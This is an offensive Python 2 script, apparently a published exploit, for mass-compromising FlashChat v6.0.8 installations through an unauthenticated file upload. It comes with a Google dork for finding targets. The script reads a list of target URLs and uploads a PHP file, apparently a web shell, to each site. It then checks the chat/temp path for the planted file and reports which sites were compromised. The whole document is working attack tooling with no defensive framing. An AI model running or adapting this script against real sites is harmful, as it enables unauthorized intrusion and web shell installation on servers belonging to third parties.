#!/usr/bin/python
#-*-coding:utf-8-*-
# Exploit Tittle : FlashChat File Upload Vulnerability
# Google Dork : intittle :FlashChat v6.0.8
# Exploit author : Deray (LOoLzeC Security)
# ig : reyy05_
from requests import get,post
print """
	[ Flashchart mass exploit ]
	       [ By Deray ]
"""
class exploit():
	def __init__(self):
		self.exploits()
	def exploits(self):
		self.a=raw_input('- weblist : ')
		self.b=open(self.a).readlines()
		print "+"+"-"*30+"+"
		for x in self.b:
			c=x.split('\n')[0]
			print "+ "+c
			payload={"file":(open('uplod.php','rb'),'multipart/form-data')}
			sodokgann=post(c,files=payload).text
			if "Can't save this file" in sodokgann:
				print "- vuln but can't uploading shell"
				print "+"+"-"*30+"+"
			elif "ok-!@" in sodokgann:
				print "+ uploaded,maybe."
				print "+ checking shell ..."
				cek=get(c+"/chat/temp/uplod.php").text
				if "LOoLzeC Security" in cek:
					print "+ PWD! :",c+"/chat/temp/uplod.php"
					print "+"+"-"*30+"+"
				else:
					print "- failed :'("
					print "+"+"-"*30+"+"
			else:
				print "- gak vuln mamang"
				print "+"+"-"*30+"+"

if __name__ == "__main__":
	try:
		exploit()
	except:
		print "\n- Error!"
		exit()